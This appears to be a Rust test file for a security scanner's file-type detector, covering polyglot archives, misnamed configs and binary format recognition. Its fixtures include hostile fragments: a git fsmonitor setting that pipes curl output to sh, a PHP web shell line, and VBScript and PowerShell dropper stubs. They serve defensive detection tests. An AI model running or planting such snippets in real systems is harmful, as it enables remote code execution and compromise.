//! Content-first detection beats extension-only fallback.

use super::*;

// ── Content-first detection beats extension-only fallback ────────

#[test]
fn roff_man_page_content_beats_source_language_heuristics() {
    let man_page = b".de EX\n.nf\n.ft CW\n..\n.de EE\n.br\n.fi\n.ft 1\n..\n\
.TH AWK 1\n.SH NAME\n.B awk\n- pattern-directed scanning and processing language\n\
.SH DESCRIPTION\n.PP\n.I Awk\n scans each input file.\n.TP\n.B -F fs\n";

    for path in ["awk.1", "renamed.js"] {
        let detection = detect(Path::new(path), man_page)
            .expect("recognizable roff manual should be identified");
        assert_eq!(detection.file_type, FileType::Text, "{path}");
        assert_eq!(detection.source, DetectionSource::Heuristic, "{path}");
        assert!(!detection.file_type.is_source_code(), "{path}");
    }

    let javascript = b"const total = 1;\nfunction add(value) { return total + value; }\n";
    assert_detect("example.js", javascript, FileType::JavaScript);

    // A lone troff-looking request is common in examples and is not a
    // document signature by itself.
    let example = b".TH is shown as a command example\nconst total = 1;\n";
    assert_detect("example.js", example, FileType::JavaScript);
}

/// Real-world polyglot: a `.zip` file whose first KB is a VBScript
/// payload (CHM/EOCD-comment dropper). Trusting the `.zip` extension
/// would route to the ZIP analyzer and fail outright; the heuristic
/// must take precedence so the script content gets analyzed and the
/// extension/content mismatch surfaces.
#[test]
fn polyglot_zip_extension_with_vbscript_body_detected_as_vbs() {
    let body = b"On Error Resume Next\r\n\
            Dim S1, FSO, Shell\r\n\
            Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n\
            Set Shell = CreateObject(\"WScript.Shell\")\r\n\
            Set S1 = CreateObject(\"ADODB.Stream\")\r\n";
    let det = detect(Path::new("Wallets.zip"), body).unwrap();
    assert_eq!(det.file_type, FileType::Vbs);
    assert_eq!(det.source, DetectionSource::Heuristic);
    // The mismatch must be visible to callers, who report "extension says
    // X but content is Y".
    assert!(det.extension_mismatch());
    assert_eq!(det.extension_type(), Some(FileType::Zip));
}

#[test]
fn content_heuristic_precedes_well_known_filename() {
    let body = b"On Error Resume Next\r\n\
            Dim S1, FSO, Shell\r\n\
            Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n\
            Set Shell = CreateObject(\"WScript.Shell\")\r\n\
            Set S1 = CreateObject(\"ADODB.Stream\")\r\n";
    let det = detect(Path::new("Makefile"), body).unwrap();
    assert_eq!(det.file_type, FileType::Vbs);
    assert_eq!(det.source, DetectionSource::Heuristic);
    assert!(det.extension_mismatch());
}

#[test]
fn cmake_commands_keep_embedded_compiler_probes_from_changing_type() {
    let body = b"cmake_minimum_required(VERSION 2.8)\nproject(json-c LANGUAGES C)\n\
        check_c_source_compiles(\"int main() { return 0; }\" HAVE_TEST)\n\
        # local function marker; then return end\n";
    for name in ["CMakeLists.txt", "checks.cmake"] {
        let found = detect(Path::new(name), body).unwrap();
        assert_eq!(found.file_type, FileType::Cmake);
        assert!(!found.extension_mismatch());
    }
    let lua =
        b"local value = setmetatable({}, {__index = function() return nil end})\nreturn value\n";
    assert_eq!(
        detect(Path::new("CMakeLists.txt"), lua).unwrap().file_type,
        FileType::Lua
    );
    let php = b"<?php system($_GET['cmd']); // cmake_minimum_required(VERSION 3.0)";
    assert_eq!(
        detect(Path::new("CMakeLists.txt"), php).unwrap().file_type,
        FileType::Php
    );
}

#[test]
fn git_config_content_identifies_extensionless_and_misnamed_files() {
    let config = b"[core]\n\
            repositoryformatversion = 0\n\
            filemode = true\n\
            [remote \"origin\"]\n\
            url = https://example.invalid/project.git\n\
            fetch = +refs/heads/*:refs/remotes/origin/*\n";

    let detection = detect(Path::new("/repo/.git/config"), config)
        .expect("Git config content must identify extensionless .git/config");
    assert_eq!(detection.file_type, FileType::Text);
    assert_eq!(detection.source, DetectionSource::Heuristic);
    assert_eq!(detection.ext_match, ExtensionMatch::Consistent);

    let misnamed = detect(Path::new("Makefile"), config)
        .expect("Git config content must beat an exact filename match");
    assert_eq!(misnamed.file_type, FileType::Text);
    assert_eq!(misnamed.source, DetectionSource::Heuristic);
    assert!(misnamed.extension_mismatch());

    // A malicious one-key core setting is still enough to identify the
    // config file, so rules can analyze its command value.
    let trigger = b"[core]\nfsmonitor = curl https://example.invalid/a | sh\n";
    assert_eq!(
        detect(Path::new("/repo/.git/config"), trigger)
            .expect("a Git fsmonitor setting is a config signature")
            .file_type,
        FileType::Text
    );
}

#[test]
fn git_config_heuristic_rejects_source_assignments_and_generic_ini() {
    let parser_variable = b"clean = re.sub(\"pattern\", \"\", raw)\n";
    assert_eq!(
        detect(Path::new("parser.py"), parser_variable)
            .expect("the source extension identifies Python")
            .file_type,
        FileType::Python
    );

    let process_variable = b"process = processes_mapping[pid]\n";
    assert_eq!(
        detect(Path::new("ps.py"), process_variable)
            .expect("the source extension identifies Python")
            .file_type,
        FileType::Python
    );

    assert!(detect(Path::new("config"), b"[core]\nversion = 2\n").is_none());
}

#[test]
fn readable_unknown_extension_is_detected_as_text_from_content() {
    let body = b"install demo /sbin/modprobe --ignore-install demo\n";
    let det = detect(Path::new("override.local"), body).unwrap();
    assert_eq!(det.file_type, FileType::Text);
    assert_eq!(det.source, DetectionSource::Heuristic);
    assert_eq!(det.ext_match, ExtensionMatch::Unknown);
    // `.conf` names a config syntax, which is text by its name.
    let det = detect(Path::new("override.conf"), body).unwrap();
    assert_eq!(det.file_type, FileType::Text);
    assert!(!det.extension_mismatch());
}

#[test]
fn binary_unknown_extension_is_not_called_text_from_filename() {
    for name in ["override.local", "override.conf"] {
        let det = detect(Path::new(name), b"\x00\x01\x02\x03binary");
        assert!(det.is_none_or(|d| d.file_type != FileType::Text), "{name}");
    }
}

/// Same idea, but with PowerShell content under a `.zip` extension —
/// covers the `.NET reflection AMSI bypass` shape we sometimes see
/// dropped under decoy archive names.
#[test]
fn polyglot_zip_extension_with_powershell_body_detected_as_ps1() {
    let body = b"$ErrorActionPreference = 'SilentlyContinue'\n\
            Invoke-Expression $payload\n\
            [Reflection.Assembly]::Load($bytes)\n";
    let det = detect(Path::new("update.zip"), body).unwrap();
    assert_eq!(det.file_type, FileType::PowerShell);
    assert!(det.extension_mismatch());
}

/// Negative: a real ZIP (PK magic) under `.zip` must still resolve
/// via magic detection, *not* via heuristics — even if the archive
/// happens to embed text that resembles script keywords later in the
/// file. Heuristics scan only the first few KB so PK at offset 0
/// short-circuits cleanly.
#[test]
fn real_zip_still_detected_by_magic_not_heuristics() {
    let mut data = b"PK\x03\x04".to_vec();
    // Append some script-like text that *would* trigger heuristics if
    // we ever reached them.
    data.extend_from_slice(b"WScript.Shell CreateObject Option Explicit");
    let det = detect(Path::new("real.zip"), &data).unwrap();
    assert_eq!(det.file_type, FileType::Zip);
    assert_eq!(det.source, DetectionSource::Magic);
    assert!(!det.extension_mismatch());
}

#[test]
fn source_extension_beats_weak_language_heuristics() {
    let go = b"package main\n\nimport \"log/slog\"\n\nfunc main() { slog.Info(\"ok\") }\n";
    let det = detect(Path::new("main.go"), go).unwrap();
    assert_eq!(det.file_type, FileType::Go);
    assert_eq!(det.source, DetectionSource::Extension);
    assert!(!det.extension_mismatch());

    let js = b"const fs = require('fs');\nvar x = 1;\nmodule.exports = x;\n";
    let det = detect(Path::new("index.js"), js).unwrap();
    assert_eq!(det.file_type, FileType::JavaScript);
    assert_eq!(det.source, DetectionSource::Extension);
    assert!(!det.extension_mismatch());
}

#[test]
fn unsupported_ocaml_extensions_skip_weak_language_heuristics() {
    let ml =
        b"open Stdune\nmodule Scheduler = Fiber.Scheduler\nlet main () = Fiber.run Scheduler.go\n";
    let det = detect(Path::new("scheduler_bench.ml"), ml).unwrap();
    assert_eq!(det.file_type, FileType::Text);
    assert_eq!(det.source, DetectionSource::Extension);
    assert!(!det.extension_mismatch());

    let mli = b"type t\nval create : unit -> t\nval run : t -> unit\n";
    let det = detect(Path::new("duneboot.mli"), mli).unwrap();
    assert_eq!(det.file_type, FileType::Text);
    assert_eq!(det.source, DetectionSource::Extension);
    assert!(!det.extension_mismatch());
}

/// Negative: a `.cargo.toml` file with text content stays in its
/// declared role via the extension/filename path. Data formats are
/// listed in `ext::is_data_format` precisely so heuristics doesn't
/// second-guess them — even if the body's first few KB include
/// keyword sequences that look script-like.
#[test]
fn data_format_extension_skips_heuristics() {
    // YAML body deliberately seeded with `===` and `WScript.` —
    // both are heuristic triggers — to confirm `.yaml` short-
    // circuits past the heuristic stage.
    let body = b"name: example\n=== heading ===\n# WScript.Shell mention\nfield: value\n";
    let det = detect(Path::new("config.yaml"), body);
    // `.yaml` isn't a recognised type in fileid's enum (treated as a
    // data format that the analyzer pipeline handles elsewhere), so
    // the function returning `None` here is correct — the important
    // assertion is that we did NOT misclassify this as JavaScript /
    // VBScript via heuristics. If a regression makes heuristics fire,
    // `det` would be `Some(JavaScript)` or similar instead of `None`.
    if let Some(d) = det {
        assert!(
            !matches!(
                d.file_type,
                FileType::JavaScript | FileType::Vbs | FileType::PowerShell
            ),
            "yaml body misclassified as {:?}",
            d.file_type
        );
    }
}

#[test]
fn package_json_in_temp_dir() {
    let det = detect(Path::new("/tmp/extract-abc123/package.json"), b"{}").unwrap();
    assert_eq!(det.file_type, FileType::PackageJson);
}

#[test]
fn package_lock_json_in_temp_dir() {
    let det = detect(Path::new("/tmp/extract-abc123/package-lock.json"), b"{}").unwrap();
    assert_eq!(det.file_type, FileType::PackageLockJson);
}

#[test]
fn cargo_toml_in_temp_dir() {
    let det = detect(Path::new("/tmp/extract-abc123/Cargo.toml"), b"[package]").unwrap();
    assert_eq!(det.file_type, FileType::CargoToml);
}

#[test]
fn composer_json_in_temp_dir() {
    let det = detect(Path::new("/tmp/extract-abc123/composer.json"), b"{}").unwrap();
    assert_eq!(det.file_type, FileType::ComposerJson);
}

/// A temp file whose name only ends with a manifest name
/// (`.tmpXXXXXX_package.json`) must NOT match filename detection: a caller
/// that copies a manifest out for analysis keeps its exact name in a temp
/// directory instead.
#[test]
fn mangled_temp_name_does_not_detect_package_json() {
    let det = detect(Path::new("/tmp/.tmpABC_package.json"), b"{}").unwrap();
    assert_eq!(det.file_type, FileType::Json);
}

/// Every variant's label is unique and round-trips through `from_label`.
/// Both come from the one `file_types!` table, and [`FileType::ALL`] is
/// generated from it too, so every variant is checked.
#[test]
fn label_round_trips() {
    use std::collections::HashSet;
    let mut seen = HashSet::new();
    for &ft in FileType::ALL {
        let label = ft.label();
        assert!(seen.insert(label), "duplicate label {label:?}");
        assert_eq!(
            FileType::from_label(label),
            Some(ft),
            "round-trip failed for {label:?}"
        );
    }
    assert_eq!(FileType::from_label("not_a_label"), None);
}

/// Every group's label round-trips, and no group is empty: each type names
/// exactly one group, so the groups partition [`FileType::ALL`].
#[test]
fn groups_partition_the_types() {
    for &group in Group::ALL {
        assert_eq!(Group::from_label(group.label()), Some(group));
        assert!(group.file_types().next().is_some(), "{group} has no types");
    }
    let grouped: usize = Group::ALL.iter().map(|g| g.file_types().count()).sum();
    assert_eq!(grouped, FileType::ALL.len());
}

/// `docs/file-groups.json` is the group table hosts vendor (model training
/// routes by group), so it must say exactly what [`FileType::group`] says.
#[test]
fn published_group_table_is_current() {
    let groups: serde_json::Map<String, serde_json::Value> = Group::ALL
        .iter()
        .map(|g| {
            let types = g.file_types().map(|t| t.label()).collect::<Vec<_>>();
            (g.label().to_string(), serde_json::json!(types))
        })
        .collect();
    let expected = format!(
        "{}\n",
        serde_json::to_string_pretty(&serde_json::json!({ "groups": groups })).unwrap()
    );
    let path = concat!(env!("CARGO_MANIFEST_DIR"), "/docs/file-groups.json");
    let published = std::fs::read_to_string(path).unwrap_or_default();
    assert!(
        published == expected,
        "{path} is stale; replace it with:\n{expected}"
    );
}

#[test]
fn serde_uses_canonical_label() {
    // The serialized form is the canonical label, not the old snake_case
    // derive — `tar.gz`, not `tar_gz`; `macho`, not `mach_o`.
    assert_eq!(
        serde_json::to_string(&FileType::TarGz).unwrap(),
        "\"tar.gz\""
    );
    assert_eq!(
        serde_json::to_string(&FileType::MachO).unwrap(),
        "\"macho\""
    );
    let ft: FileType = serde_json::from_str("\"python_sdist\"").unwrap();
    assert_eq!(ft, FileType::PythonSdist);
    assert!(serde_json::from_str::<FileType>("\"tar_gz\"").is_err());
}

#[test]
fn apple_plist_xml_and_strings_names_agree_with_native_serializations() {
    let xml = br#"<?xml version="1.0"?><plist version="1.0"><dict><key>x</key><string>y</string></dict></plist>"#;
    let binary = b"\x62\x70\x6c\x69\x73\x74\x30\x30\xd1\x01\x02\x51\x78\x51\x79\x08\x0b\x0d\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f";
    for (name, data) in [
        ("entitlements.xml", xml.as_slice()),
        ("InfoPlist.strings", xml.as_slice()),
        ("InfoPlist.strings", binary.as_slice()),
    ] {
        let id = FileId::from_path_and_bytes(Path::new(name), data);
        assert_eq!(id.file_type(), FileType::Plist, "{name}");
        assert!(
            !id.extension_mismatch(),
            "native plist encoding is allowed by {name}"
        );
    }
    assert!(FileId::from_path_and_bytes(Path::new("payload.xml"), binary).extension_mismatch());
    assert!(FileId::from_path_and_bytes(Path::new("payload.png"), xml).extension_mismatch());
    assert!(
        FileId::from_path_and_bytes(Path::new("payload.strings"), b"\x7fELF\x02\x01\x01\x00")
            .extension_mismatch()
    );
}

#[test]
fn dos_com_entry_tracks_service_across_argument_setup() {
    for code in [
        &b"\xb4\x4c\xb0\x00\xcd\x21"[..],
        &b"\xb4\x4e\xb9\x07\x00\xba\x20\x01\x2e\xcd\x21"[..],
        &b"\xb8\x02\x3d\xba\x9e\x00\xcd\x21"[..],
        &b"\xb4\x4e\xe8\x03\x00\xc3\x90\x90\xb9\x08\x00\x90\xcd\x21\xc3"[..],
    ] {
        let mut bytes = code.to_vec();
        bytes.resize(64, 0);
        assert_detect("opaque.sample", &bytes, FileType::DosCom);
    }
}

#[test]
fn dos_com_entry_rejects_stale_or_unreachable_selectors() {
    for code in [
        &b"\xb4\x4e\x31\xc0\xba\x20\x01\xcd\x21"[..],
        &b"\xb4\x4e\xc3\xba\x20\x01\xcd\x21"[..],
        &b"\xb4\x4e\xeb\x06\xba\x20\x01\xcd\x21\x90\xc3"[..],
        &b"\xb0\x4e\xba\x20\x01\xcd\x21"[..],
    ] {
        let mut bytes = code.to_vec();
        bytes.resize(64, 0);
        assert!(
            detect(Path::new("opaque.sample"), &bytes)
                .is_none_or(|d| d.file_type != FileType::DosCom)
        );
    }
}

#[test]
fn vhd_footer_recognition_is_structural() {
    fn footer(data: &mut [u8], kind: u32, size: u64) {
        let n = data.len();
        let f = &mut data[n - 512..];
        f[..8].copy_from_slice(b"conectix");
        f[12..16].copy_from_slice(&0x0001_0000u32.to_be_bytes());
        f[16..24].copy_from_slice(&(if kind == 2 { u64::MAX } else { 512 }).to_be_bytes());
        f[48..56].copy_from_slice(&size.to_be_bytes());
        f[60..64].copy_from_slice(&kind.to_be_bytes());
        f[64..68].fill(0);
        let sum = !f.iter().map(|b| u32::from(*b)).sum::<u32>();
        f[64..68].copy_from_slice(&sum.to_be_bytes());
    }
    let mut fixed = vec![0u8; 1024];
    footer(&mut fixed, 2, 512);
    assert_detect("opaque", &fixed, FileType::Vhd);
    let mut sparse = vec![0u8; 2048];
    sparse[512..520].copy_from_slice(b"cxsparse");
    sparse[536..540].copy_from_slice(&0x0001_0000u32.to_be_bytes());
    footer(&mut sparse, 3, 4096);
    assert_detect("opaque.bin", &sparse, FileType::Vhd);
    for at in [0usize, 64, 100] {
        let mut broken = fixed.clone();
        broken[512 + at] ^= 1;
        assert!(detect(Path::new("opaque"), &broken).is_none_or(|d| d.file_type != FileType::Vhd));
    }
    footer(&mut fixed, 2, 4096);
    assert!(detect(Path::new("opaque"), &fixed).is_none_or(|d| d.file_type != FileType::Vhd));
    sparse[512] ^= 1;
    assert!(detect(Path::new("opaque"), &sparse).is_none_or(|d| d.file_type != FileType::Vhd));
}

#[test]
fn prefixed_utf16_html_extension_uses_decoded_content() {
    let text = "%builder_placeholder%\r\n<html><head><hta:application id=\"x\"/></head><body></body></html>";
    for little in [true, false] {
        let mut data = if little {
            vec![0xff, 0xfe]
        } else {
            vec![0xfe, 0xff]
        };
        for unit in text.encode_utf16() {
            data.extend_from_slice(&if little {
                unit.to_le_bytes()
            } else {
                unit.to_be_bytes()
            });
        }
        for name in ["document.hta", "document.html", "document.htm"] {
            assert_detect(name, &data, FileType::Html);
        }
    }
    let mut prose = vec![0xff, 0xfe];
    prose.extend(
        "ordinary prose without markup"
            .encode_utf16()
            .flat_map(u16::to_le_bytes),
    );
    assert_ne!(
        detect(Path::new("not-html.hta"), &prose).map(|d| d.file_type),
        Some(FileType::Html)
    );
}
